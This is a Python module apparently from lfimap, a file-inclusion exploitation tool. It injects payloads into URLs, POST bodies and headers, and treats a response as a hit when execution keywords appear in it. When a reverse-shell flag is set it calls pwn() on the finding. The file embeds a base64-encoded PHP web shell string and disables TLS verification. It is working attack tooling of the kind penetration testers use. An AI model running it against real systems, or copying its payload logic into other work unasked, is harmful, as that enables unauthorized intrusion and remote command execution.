from src.utils.arguments import args
from src.utils.encodings import encode
from src.utils.stats import stats
from src.configs import config
from src.attacks.pwn import *
from src.utils import colors
from src.utils.cleanup import lfimap_cleanup
from src.utils.args_check import headers
from src.utils.parseurl import is_valid_json
from src.utils.parseurl import convert_http_formdata_to_json

import requests
import requests.exceptions
import socket
import time
import urllib.parse as urlparse
import urllib3

def addToExploits(req, request_type, exploit_type, getVal, postVal, headers, attackType, os):
    e = {}
    e['REQUEST_TYPE'] = request_type
    e['EXPLOIT_TYPE'] = exploit_type
    e['GETVAL'] = getVal
    e['POSTVAL'] = postVal
    e['HEADERS'] = req.headers
    e['ATTACK_METHOD'] = attackType
    e['OS'] = os
    config.exploits.append(e)
    return e

def init(req, reqType, explType, getVal, postVal, headers, attackType, cmdInjectable = False):

    if(config.scriptName != ""):
        config.TO_REPLACE.append(config.scriptName)
        config.TO_REPLACE.append(config.scriptName+".php")
        config.TO_REPLACE.append(config.scriptName+"%00")

    if(checkPayload(req) or cmdInjectable):
        for i in range(len(config.TO_REPLACE)):
            if(postVal and isinstance(postVal, bytes)):
                postVal = postVal.decode('utf-8')
            if(getVal.find(config.TO_REPLACE[i]) > -1 or getVal.find("?c=" + config.TO_REPLACE[i]) > -1 or postVal.find(config.TO_REPLACE[i])):
                u = getVal.replace(config.TO_REPLACE[i], config.tempArg)
                if(postVal.find(config.TO_REPLACE[i]) > -1): 
                    p = postVal.replace(config.TO_REPLACE[i], config.tempArg)
                else: p= ""
                if("windows" in config.TO_REPLACE[i].lower() or "ipconfig" in config.TO_REPLACE[i].lower() or "Windows IP Configuration" in req.text):
                    os = "windows"
                else: os = "linux"
                
                exploit = addToExploits(req, reqType, explType, u, p, headers, attackType, os)
                
                #Print finding
                if(postVal == ""):
                    print(colors.green("[+]") + " " + explType + " -> '" + getVal + "'")
                    stats["vulns"] += 1
                else:
                    print(colors.green("[+]") + " " + explType + " -> '" + getVal + "' -> HTTP POST -> '" + postVal + "'")
                    stats["vulns"] += 1

                if(args.revshell):
                    pwn(exploit)
                
                if not args.no_stop:
                    return True
                return False

    return False

#Checks if sent payload is executed, if any of the below keywords are in the response, returns True
def checkPayload(webResponse):
    for word in config.KEY_WORDS:
        if(webResponse):
            if(word in webResponse.text):
                if(word == "PD9w" and "PD9waHAgc3lzdGVtKCRfR0VUW2NdKTsgPz4K" in webResponse.text):
                    return False
                return True
    return False

def prepareRequest(parameter, payload, url, postData):
    if(parameter in url): reqUrl = url.replace(parameter, encode(payload))
    else: reqUrl = url
    
    #if postData and args.json and not is_valid_json(args.json):
    #    reqData = convert_http_formdata_to_json(postData.replace(parameter, encode(payload)).lstrip())
    if postData:
        reqData = postData.replace(parameter, encode(payload)).lstrip()
    elif postData:
        reqData = postData.replace(parameter, encode(payload)).lstrip()
    else: reqData = ""

    reqHeaders = {}
    if(parameter in args.httpheaders.values()):
        for key, value in args.httpheaders.items():
            if(parameter in value): reqHeaders[key.strip()] = value.replace(parameter, encode(payload)).encode('utf-8')
            else: reqHeaders[key] = value
    
    else: return reqUrl, args.httpheaders, reqData
    return reqUrl, reqHeaders, reqData


def REQUEST(url, headersData, postData, proxy, exploitType, exploitMethod, exploit = False, followRedirect = True):
    doContinue = True
    res = None
    if(not postData): postData = ""
    try:
        stats["requests"] += 1
        # Set the timeout on the testing request, based on proxy and user-provided value
        if(exploitMethod == "RFI"): timeout = 15
        elif(args.maxTimeout): timeout = args.maxTimeout
        elif(args.proxyAddr): timeout = 15
        else: timeout = 5

        #TODO dunno about this if, myb timeout should be on all of them
        if(exploitMethod == "test" or exploitMethod == "RFI"): 
            res = requests.request(args.method, url, data=postData, headers=headersData, proxies=proxy, verify=False, timeout = timeout, allow_redirects = followRedirect)
        else: res = requests.request(args.method, url, data=postData, headers=headersData, proxies=proxy, verify=False, allow_redirects = followRedirect)

        #TODO exploitMethod and exploitType are not being used?
        if(not exploit):
            if(init(res, "", exploitType, url, postData, headersData, exploitMethod)):
                doContinue = False

        if(args.log):
            with open(args.log, 'a+') as fp:

                # Log request
                splitted = url.split("/")
                fp.write(res.request.method + " " + url.replace(''.join(splitted[0]+ "/" + splitted[1] + "/" + splitted[2]), "") + " HTTP/1.1\n")
                fp.write("Host: " + splitted[2] + "\n")
                for k,v in res.request.headers.items():
                    if(not(isinstance(k, str))): k = k.decode('utf-8')
                    if(not(isinstance(v, str))): v = v.decode('utf-8')
                    fp.write(k + ": " + v + "\n")

                if(res.request.body):
                    fp.write("\n"*2)
                    fp.write(res.request.body.decode("utf-8"))
                fp.write("\n"*3)

                # Log response
                protocol = "HTTP/1.1"

                fp.write(protocol + " " + str(res.status_code) + " " + res.reason + "\n")
                for k,v in res.headers.items():
                    if(not(isinstance(k, str))): k = k.decode('utf-8')
                    if(not(isinstance(v, str))): v = v.decode('utf-8')
                    fp.write(k + ": " + v + "\n")
                fp.write("\n\n")
                fp.write(res.text + "\n")
                fp.write("--\n\n\n")

        if(args.delay):
            time.sleep(args.delay/1000)

    except KeyboardInterrupt:
        print("\nKeyboard interrupt detected. Exiting...")
        lfimap_cleanup(config.webDir, stats)
    except requests.exceptions.InvalidSchema:
        if(args.verbose):
            print(colors.red("[-]") + " InvalidSchema exception detected. Server cannot parse the parameter URI.")
        return False, False
    except requests.exceptions.ConnectionError:
        print(colors.red("[-]") + " ConnectionError occurred. Cannot connect to the server. Check if specified URL is correct. Skipping...")
        return False, False
    except socket.timeout:
        if(exploitMethod == "RFI" and not args.callback and not args.lhost): print(colors.green("[?]") + " Socket timeout. This could be an indication for RFI vulnerability. Try specifying '--lhost' or '--callback' to confirm...")
        else: print(colors.red("[-]") + " Socket timeout. Try specifying bigger '--delay' or '--max-timeout'. Skipping...")
        return False, False
    except requests.exceptions.ReadTimeout:
        if(exploitMethod == "RFI" and not args.callback and not args.lhost): print(colors.green("[?]") + " Read timeout. This could be an indication for RFI vulnerability. Try specifying '--lhost' or '--callback' to confirm.")
        else: print(colors.red("[-]") + " Read timeout. Try specifying bigger '--delay' or '--max-timeout'. Skipping...")
        return False, False
    except urllib3.exceptions.ReadTimeoutError:
        if(exploitMethod == "RFI" and not args.callback and not args.lhost): print(colors.green("[?]") + " Read timeout. This could be an indication for RFI vulnerability. Try specifying '--lhost' or '--callback' to confirm.")
        else: print(colors.red("[-]") + " Read timeout. Try specifying bigger '--delay' or '--max-timeout'. Skipping...")
        return False, False
    except ConnectionRefusedError:
        print(colors.red("[-]") + " ConnectionRefusedError occurred. Skipping...")
        return False, False
    except:
        if(args.verbose):
            print(colors.red("[-]") + " The uncaught exception has ocurred. Printing trace...")
        raise
        return False, False

    return res, doContinue

